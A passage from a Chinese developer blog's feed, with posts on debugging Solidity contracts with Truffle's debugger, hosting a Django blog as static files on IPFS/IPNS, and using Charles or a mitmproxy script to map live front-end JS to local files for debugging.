| 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;           ^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;           ^^^^^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {         ^^^^^^^^^^^^</code></pre><p>请注意，最终步骤会一直重复。事实上，按回车会永远重复那些交易(直到用完 gas )。而这会告诉你问题在哪里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 错误 #2: 无效错误检查</span><br><span class="line"></span><br><span class="line">智能合约可以用 `assert()` 来保证必要特定条件会出现。这种和合约状态的冲突是不可调和的。</span><br><span class="line"></span><br><span class="line">**引入错误**</span><br><span class="line"></span><br><span class="line">现在我们来引入这个错误，看看调试器如何发现它。</span><br><span class="line"></span><br><span class="line">1. 再次打开 `Store.sol`</span><br><span class="line">2. 替换 `set()` 函数</span><br></pre></td></tr></table></figure></p><pre><code>function set(uint x) public {  assert(x == 0);  myVariable = x;}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    和前一个版本一样，只是多了 `assert()` 函数，保证 `x == 0`，如果我们设置 x 为其他值，我们就会发现错误。</span><br><span class="line">    </span><br><span class="line">**测试合约**</span><br><span class="line"></span><br><span class="line">和之前一样，我们重置下合约</span><br><span class="line"></span><br><span class="line">1. `migrate --reset`</span><br><span class="line">2. `SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    我们会看到如下错误</span><br></pre></td></tr></table></figure>Error: VM Exception while processing transaction: invalid opcode<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**调试错误**</span><br><span class="line"></span><br><span class="line">1. 复制交易 id 到 debug 命令下</span><br></pre></td></tr></table></figure>debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">回到调试器</span><br></pre></td></tr></table></figure></code></pre><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>   1: pragma solidity ^0.4.17;<br>   2:<br>   3: contract SimpleStorage {<br>      ^^^^^^^^^^^^^^^^^^^^^^^</p><p>   debug(develop:0xe4933407…)&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 键入 `Enter`</span><br></pre></td></tr></table></figure></p><pre><code>    Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:5:6:   function set(uint x) public {7:     assert(x == 0);       ^^^^^^^^^^^^^^debug(develop:0x7e060037...)&gt;Transaction halted with a RUNTIME ERROR.This is likely due to an intentional halting expression, like assert(), require() or revert(). It can also be due to out-of-gasexceptions. Please inspect your transaction parameters and contract code to determine the meaning of this error.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们可以看到最后的事件中触发了错误.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 错误 #3: 无错误，但是函数没有按预期执行</span><br><span class="line"></span><br><span class="line">有时候，错误不一定是真正的错误，它在运行时间内不会引起问题，只是不会按预期执行。</span><br><span class="line"></span><br><span class="line">举个例子，一个事件将会在变量是奇数的时候执行，而另一个事件在偶数的时候执行。如果我们调换了这个条件，让相反的事件执行了。它斌不会触发错误，然而，合约会不按照我们的预期执行下去。</span><br><span class="line"></span><br><span class="line">我们再次用调试器来找出错误。</span><br><span class="line"></span><br><span class="line">**引入错误**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. 再次打开 `Store.sol`</span><br><span class="line">2. 替换 `set()` 函数</span><br></pre></td></tr></table></figure>event Odd();event Even();function set(uint x) public {  myVariable = x;  if (x % 2 == 0) {    Odd();  } else {    Even();  }}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    代码有两个假的事件，`Odd()` 和 `Even()` 是否执行取决于 x 是否能被 2 整除。</span><br><span class="line">    </span><br><span class="line">    但是我们发现 x 能被 2 整除时， `Odd()` 事件触发了。</span><br><span class="line"></span><br><span class="line">**测试合约**</span><br><span class="line"></span><br><span class="line">1. `migrate --reset`</span><br><span class="line">2. `SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);`</span><br><span class="line"></span><br><span class="line">没有错误产生，输出如下</span><br></pre></td></tr></table></figure></code></pre><p>{ tx: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>  receipt:<br>   { transactionHash: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>     transactionIndex: 0,<br>     blockHash: ‘0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f’,<br>     blockNumber: 5,<br>     gasUsed: 42404,<br>     cumulativeGasUsed: 42404,<br>     contractAddress: null,<br>     logs: [ [Object] ] },<br>  logs:<br>   [ { logIndex: 0,<br>       transactionIndex: 0,<br>       transactionHash: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>       blockHash: ‘0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f’,<br>       blockNumber: 5,<br>       address: ‘0x377bbcae5327695b32a1784e0e13bedc8e078c9c’,<br>       type: ‘mined’,<br>       event: ‘Odd’,<br>       args: {} } ] }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">logs 里面显示调用了 Odd 事件，这是不对的，我们的任务是找到这个事件为什么会被触发。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> **调试错误**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. 复制交易 id 到 debug 命令下</span><br></pre></td></tr></table></figure></p><p>debug 0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 键入 Enter 几次，最后我们将看到调用 Odd 事件的条件</span><br></pre></td></tr></table></figure></p><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>10:   function set(uint x) public {<br>11:     myVariable = x;<br>12:     if (x % 2 == 0) {<br>        ^^^^^^^^^^^^^^^^</p><p>debug(develop:0x7f799ad5…)&gt;</p><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>11:     myVariable = x;<br>12:     if (x % 2 == 0) {<br>13:       Odd();<br>          ^^^^^</p><p>debug(develop:0x7f799ad5…)&gt;<br>```</p><p>错误找到了，这个条件导致了错误的事件调用。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>有了在 Truffle 中的调试能力，你可以编写更健壮的智能合约。</p><p>翻译自： <a href="http://truffleframework.com/tutorials/debugging-a-smart-contract" target="_blank" rel="noopener">http://truffleframework.com/tutorials/debugging-a-smart-contract</a></p><p>更多内容请访问：<a href="https://www.bdaily.club/" target="_blank" rel="noopener">区块链日报 - 关注区块链 - 推送高质量区块链文章</a></p><p>订阅区块链日报</p><p>微博： <a href="https://weibo.com/u/6453120687" target="_blank" rel="noopener">@区块链_daily</a><br>RSS: <a href="https://www.bdaily.club/rss" target="_blank" rel="noopener">rss</a><br>Twitter: <a href="https://twitter.com/bchain_daily" target="_blank" rel="noopener">@区块链日报</a><br>知乎： <a href="https://zhuanlan.zhihu.com/btchain" target="_blank" rel="noopener">区块链日报</a><br>Medium: <a href="https://medium.com/@blockchaindaily" target="_blank" rel="noopener">区块链日报</a><br>微信公众号: 搜索 【区块链daily】或 <a href="http://78rc6b.com1.z0.glb.clouddn.com/qrcode_for_gh_f652585159d6_258.jpg" target="_blank" rel="noopener">点击扫二维码关注</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;注意：本教程的 Truffle 版本 4.4.0 及以上&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不像你在其他地方看到的纸质合约，以太坊的智能合约是代码组成的，需要你以非常谨慎的态度去对待它。&lt;/p&gt;
&lt;p&gt;（这是一件好事，想象下如果现实世界的合同需要编译的话会更清晰么？）&lt;/p&gt;
&lt;p&gt;如果我们的合同没有被正确的编码出来, 我们的交易可能会失败，导致以太币的损失(以 gas 的形式)，更不用说浪费时间和精力。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;幸运的是，Truffle (版本 4 以上) 内置了逐步调试的功能&lt;/strong&gt;，所以一旦发生错误，你可以很快发现并修复它。&lt;/p&gt;
&lt;p&gt;在本教程中,我们将在测试的区块链环境中部署一个基础的合同，并引入一些错误，通过 Truffle 内置调试器修复它们。&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>利用 ipfs 构建去中心化 django 博客系统</title>
    <link href="https://facert.github.io/2018/02/25/%E5%88%A9%E7%94%A8-ipfs-%E6%9E%84%E5%BB%BA%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96-django-%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
    <id>https://facert.github.io/2018/02/25/利用-ipfs-构建去中心化-django-博客系统/</id>
    <published>2018-02-25T04:10:54.000Z</published>
    <updated>2018-04-06T09:11:31.908Z</updated>
    
    <content type="html"><![CDATA[<h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>运营 <a href="https://www.btchain.me/" target="_blank" rel="noopener">区块链日报</a> 有一段时间了，访问量也在不断上涨，不过由于搭建在国外 vps 上，所以经常有同学反映网站打不开。这段时间尝试了一些方案，发现 ipfs 的去中心化方案能够完美这个问题。</p><p>关注区块链的同学也许已经对 <a href="https://ipfs.io/" target="_blank" rel="noopener">ipfs</a> 有过一定了解，我也在日报中推送过好几篇相关的文章，感兴趣的同学可以关注下。这里我简单介绍下，ipfs 是一个点对点的分布式文件系统，只要文件被添加到 ipfs 节点上，他就有个 hash 值来代表他的存在，哪怕只在文件中修改一个比特的数据，哈希都会完全不同。当下一步向 ipfs 分布式网络查找该哈希的时候，它通过使用一个分布式哈希表，可以快速地找到拥有数据的节点，从而检索该数据，并使用哈希验证这是否是正确的数据。而存储这些文件的节点我们可以认为也是一种矿工的形式，只是不像比特币利用算力来做工作量证明，而是存储和带宽。目前 ipfs 团队正在推进发布基于 POR (带激励机制的带宽，存储容量等资源相关的一种共识)的 filecoin。<br><a id="more"></a></p><h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p>好了，介绍完 ipfs，我们来看下 ipfs 如何和 django 结合起来搭建自己的去中心化 cdn。</p><p>由于 django 搭建的网站的网页是动态服务器渲染的，而 ipfs 只能存储静态文件，所以需要先将 django 的网页静态化，然后再上传到 ipfs。</p><p>举 <a href="https://www.btchain.me/" target="_blank" rel="noopener">区块链日报</a> 为例，有两种方案可以实现</p><ol><li>每次在 admin 后台创建日报保存的时候，生成静态网页文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def generate_static_html(issue):</span><br><span class="line">    articles = Article.objects.filter(issue=issue, status=2).order_by(&quot;-created&quot;)</span><br><span class="line">    context = &#123;&apos;articles&apos;: articles, &quot;issue&quot;: issue&#125;</span><br><span class="line">    static_html = os.path.join(settings.IPFS_ROOT, &quot;%s.html&quot; % issue.id)</span><br><span class="line">    content = render_to_string(&apos;articles_ipfs.html&apos;, context)</span><br><span class="line">    with open(static_html, &apos;w&apos;) as static_file:</span><br><span class="line">        static_file.write(content.encode(&quot;utf-8&quot;))</span><br><span class="line">        </span><br><span class="line">class IssueAdmin(admin.ModelAdmin):</span><br><span class="line"></span><br><span class="line">    def save_model(self, request, obj, form, change):</span><br><span class="line">        obj.save()</span><br><span class="line">        if obj.status == Issue.PUBLISHED:</span><br><span class="line">            generate_static_html(obj)</span><br></pre></td></tr></table></figure><ol><li>定期生成全站的静态文件，然后同步到 ipfs</li></ol><h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>接下来我们利用 ipfs 上传上文生成的静态文件。</p><ol><li><p>安装 ipfs 可直接参考官方教程，<a href="https://ipfs.io/docs/install/" target="_blank" rel="noopener">https://ipfs.io/docs/install/</a>, 这里假设安装的是 <code>go-ipfs</code> </p></li><li><p>然后执行 <code>ipfs init</code>，会在本地建立一个 ipfs 节点。</p></li><li><p>查看节点 id <code>ipfs id</code></p></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    &#123;</span><br><span class="line">&quot;ID&quot;: &quot;QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV&quot;,</span><br><span class="line">&quot;PublicKey&quot;: &quot;CAASpgIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFsZQi+VdfZIHTcNwsAMfjaAo9fe7GtiusbF4ZWqGxo3v05sHXrHbM1fb+FRnCmzZ7tZ679EfgxCzN38q1bAvOQVtdD/TzDQQKrLJEOyorhnML8cOtMWua/Rkvfs56Ut6fPgVHvCFpuhrUZE8eBTwKInf5kJaEOZfT/u9pi3BO5HJMUO1oHE6R66IKO3QQda3QXahx4dndc3Sx7HX+MeBd6kUPTpOtqmeFIRJE0rDSXnIxiUGlqkMbfIAgBo4XKBuajm+UMLTCT5Wo/0cNu+j8mLuNLqwcOWNR7KKKCZzUFrm+TCxMjAusy2ujgunH19vIMluGlOgiXvydwrbmZiU1AgMBAAE=&quot;,</span><br><span class="line">&quot;Addresses&quot;: null,</span><br><span class="line">&quot;AgentVersion&quot;: &quot;go-ipfs/0.4.13/&quot;,</span><br><span class="line">&quot;ProtocolVersion&quot;: &quot;ipfs/0.1.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><ol><li><p>启动节点服务器 <code>ipfs daemon</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Initializing daemon...</span><br><span class="line">Swarm listening on /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm listening on /ip4/172.22.0.29/tcp/4001</span><br><span class="line">Swarm listening on /ip4/192.168.99.172/tcp/4001</span><br><span class="line">Swarm listening on /ip6/::1/tcp/4001</span><br><span class="line">Swarm listening on /p2p-circuit/ipfs/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV</span><br><span class="line">Swarm announcing /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm announcing /ip4/172.22.0.29/tcp/4001</span><br><span class="line">Swarm announcing /ip4/192.168.1.2/tcp/36734</span><br><span class="line">Swarm announcing /ip4/192.168.99.172/tcp/4001</span><br><span class="line">Swarm announcing /ip6/::1/tcp/4001</span><br><span class="line">API server listening on /ip4/127.0.0.1/tcp/5001</span><br><span class="line">Gateway (readonly) server listening on /ip4/127.0.0.1/tcp/8080</span><br><span class="line">Daemon is ready</span><br></pre></td></tr></table></figure></li><li><p>这个时候访问 <a href="http://localhost:5001/webui" target="_blank" rel="noopener">http://localhost:5001/webui</a> ，就可以看到本地节点的一些信息，包括文件 hash ，正在连接的节点，配置项。你也可以直接在这里选择上传文件。</p></li><li><p>我们可以通过命令直接上传整个静态文件目录 <code>ipfs add -r ipfs</code>， ipfs 为上文生成的静态文件目录。</p></li></ol><p><img src="/media/15195409091484.jpg" alt=""></p><ol><li>可以看到根路径的 hash 为 <code>QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE</code> ，直接访问 <a href="https://ipfs.io/ipfs/QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE/index_ipfs.html" target="_blank" rel="noopener">https://ipfs.io/ipfs/QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE/index_ipfs.html</a> </li></ol><p><img src="/media/15195614553288.jpg" alt=""></p><ol><li><p>目前网址已经能够访问，不过会存在一个问题， hash 值会随着文件的变化而变化，也就是一旦网站有更新，上文的地址就变了，所以我们可以将网站发布到 IPNS，将节点的 id （不会随文件变化而变化）绑定到项目根目录 hash, 这样更新博客的时候，重新发布到 IPNS 即可。</p></li><li><p>很简单的命令，执行 <code>ipfs name publish &lt;根目录 hash&gt;</code> 便可，发布完成后，可以执行 <code>ipfs name resolve &lt;节点 id&gt;</code>，查看是否绑定。</p></li></ol><p><img src="/media/15195621769351.jpg" alt=""></p><ol><li>最后访问 <a href="https://ipfs.io/ipns/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV/index_ipfs.html" target="_blank" rel="noopener">https://ipfs.io/ipns/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV/index_ipfs.html</a> ，同样也能得到想要的页面。</li></ol><h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>最后简单介绍下区块链日报吧，区块链日报是一个博客，灵感来自于湾区日报。主要记录博主在学习区块链当中读过的高质量区块链文章，通过一些渠道(<a href="https://weibo.com/u/6453120687" target="_blank" rel="noopener">微博</a>，<a href="https://zhuanlan.zhihu.com/btchain" target="_blank" rel="noopener">知乎</a>，<a href="https://twitter.com/bchain_daily" target="_blank" rel="noopener">Twitter</a>，<a href="https://www.btchain.me/rss" target="_blank" rel="noopener">RSS</a>, <a href="https://medium.com/@blockchaindaily" target="_blank" rel="noopener">Medium</a>)定时发布推送。</p><p>网站采用 django 搭建，nginx 做负载均衡，supervisord 管理进程，Task Queue 是 Redis。Scheduler 用的是 Celery Beat，Async Worker 是 Celery。</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h5&gt;&lt;p&gt;运营 &lt;a href=&quot;https://www.btchain.me/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;区块链日报&lt;/a&gt; 有一段时间了，访问量也在不断上涨，不过由于搭建在国外 vps 上，所以经常有同学反映网站打不开。这段时间尝试了一些方案，发现 ipfs 的去中心化方案能够完美这个问题。&lt;/p&gt;
&lt;p&gt;关注区块链的同学也许已经对 &lt;a href=&quot;https://ipfs.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ipfs&lt;/a&gt; 有过一定了解，我也在日报中推送过好几篇相关的文章，感兴趣的同学可以关注下。这里我简单介绍下，ipfs 是一个点对点的分布式文件系统，只要文件被添加到 ipfs 节点上，他就有个 hash 值来代表他的存在，哪怕只在文件中修改一个比特的数据，哈希都会完全不同。当下一步向 ipfs 分布式网络查找该哈希的时候，它通过使用一个分布式哈希表，可以快速地找到拥有数据的节点，从而检索该数据，并使用哈希验证这是否是正确的数据。而存储这些文件的节点我们可以认为也是一种矿工的形式，只是不像比特币利用算力来做工作量证明，而是存储和带宽。目前 ipfs 团队正在推进发布基于 POR (带激励机制的带宽，存储容量等资源相关的一种共识)的 filecoin。&lt;br&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>前端线上调试指南</title>
    <link href="https://facert.github.io/2018/01/27/%E5%89%8D%E7%AB%AF%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>https://facert.github.io/2018/01/27/前端线上调试指南/</id>
    <published>2018-01-27T09:46:08.000Z</published>
    <updated>2018-01-28T04:45:26.370Z</updated>
    
    <content type="html"><![CDATA[<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。</p><p>所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。</p><p>我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)</p><p>下面我们举 charles 和 mitmproxy 为例子说明<br><a id="more"></a></p><h5 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h5><ol><li><p>打开 charles, 点击 Tools -&gt; Map Local -&gt; Add， 将需要的 Path 映射到 Local path （自己的本地目录），然后找到自己需要映射的目录或文件，（比如 js 目录）。</p><p><img src="/media/15170629957005.jpg" alt=""></p></li></ol><ol><li>这里面我们也可以选择 Map Remote 模式，它能映射到 url 地址，如 www.example.com/js -&gt; test.example.com/js</li></ol><ol><li>接下来我们只需让浏览器代理到 charles 即可，charles 默认开启的是 http 代理，8888 端口</li></ol><ul><li>Chrome 用户下载插件 switchyOmega，配置如下</li></ul><p><img src="/media/15170631701355.jpg" alt=""></p><ul><li>Safari 用户不用装插件，只需 charles -&gt; Proxy -&gt; MacosProxy 选中即可。</li></ul><ol><li>配置完成！接下来你本地对 js 的改动，直接能够作用在 exampel.com 上。</li></ol><h5 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h5><p>mitmproxy 没有界面，只能在终端运行，不过它可以定制 python 插件，实现想要的功能。</p><p>接下来我先介绍下原理，为什么本地的文件能直接作用于线上。</p><p>原理在于我们使用了代理，或者更准确一点叫中间人劫持，不过这个中间人是我们自己。</p><p>代理软件在代理我们访问的网页时，会根据我们配置的规则修改返回给我们的内容，比如我们访问 example.com/js/a.js 的时候，发现我们配置了规则是去本地找 a.js 这个文件，找到这个文件，拿到内容后，会直接将 response 的 boby 内容改成本地的内容，这样浏览器就会根据本地内容做渲染。</p><p>我们用 mitmproxy 的脚本来实现，自定义一个文件 test.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import glob</span><br><span class="line">from mitmproxy import http</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 拿到本地 a.js 的内容</span><br><span class="line">main_js = glob.glob(&apos;./js/a\.js&apos;)</span><br><span class="line">main_content = &apos;&apos;</span><br><span class="line">if main_js:</span><br><span class="line">    with open(main_js[0]) as f:</span><br><span class="line">        main_content = f.read()</span><br><span class="line"></span><br><span class="line"># 匹配 example.com/js/a.js 的内容</span><br><span class="line">pattern = re.compile(&quot;http://example\.com/js/a\.js&quot;)</span><br><span class="line"></span><br><span class="line">def request(flow: http.HTTPFlow) -&gt; None:</span><br><span class="line">    if pattern.match(flow.request.pretty_url):</span><br><span class="line">        flow.response = http.HTTPResponse.make(</span><br><span class="line">            200,</span><br><span class="line">            main_content,</span><br><span class="line">            &#123;&quot;Content-Type&quot;: &quot;application/javascript&quot;,</span><br><span class="line">             &quot;Content-Encoding&quot;: &quot;gzip&quot;&#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p>然后运行 <code>mitmdump  -s test.py</code> 就可达到和 charles 一样的效果。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; title=&quot;场景&quot;&gt;&lt;/a&gt;场景&lt;/h4&gt;&lt;p&gt;前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。&lt;/p&gt;
&lt;p&gt;所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。&lt;/p&gt;
&lt;p&gt;我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)&lt;/p&gt;
&lt;p&gt;下面我们举 charles 和 mitmproxy 为例子说明&lt;br&gt;
    
    </summary>
    
    
      <category term="前端" scheme="https://facert.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>开源【动态可配化爬虫】代码</title>
    <link href="https://facert.github.io/2018/01/13/%E5%BC%80%E6%BA%90%E3%80%90%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E5%8C%96%E7%88%AC%E8%99%AB%E3%80%91%E4%BB%A3%E7%A0%81/"/>
    <id>https://facert.github.io/2018/01/13/开源【动态可配化爬虫】代码/</id>
    <published>2018-01-13T06:17:37.000Z</published>
    <updated>2018-01-27T14:46:12.908Z</updated>
    
    <content type="html"><![CDATA[<p>继上篇文章 <a href="https://zhuanlan.zhihu.com/p/31659456" target="_blank" rel="noopener">动态可配置化 Python 爬虫</a> 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自己去折腾完善，欢迎提 pr。</p><p>项目地址：<a href="https://github.com/facert/scrapy_helper" target="_blank" rel="noopener">https://github.com/facert/scrapy_helper</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继上篇文章 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/31659456&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;动态可配置化 Python 爬虫&lt;/a&gt; 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>以太坊云撸猫教程</title>
    <link href="https://facert.github.io/2017/12/10/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BA%91%E6%92%B8%E7%8C%AB%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/10/以太坊云撸猫教程/</id>
    <published>2017-12-10T04:12:11.000Z</published>
    <updated>2018-04-06T09:11:20.005Z</updated>
    
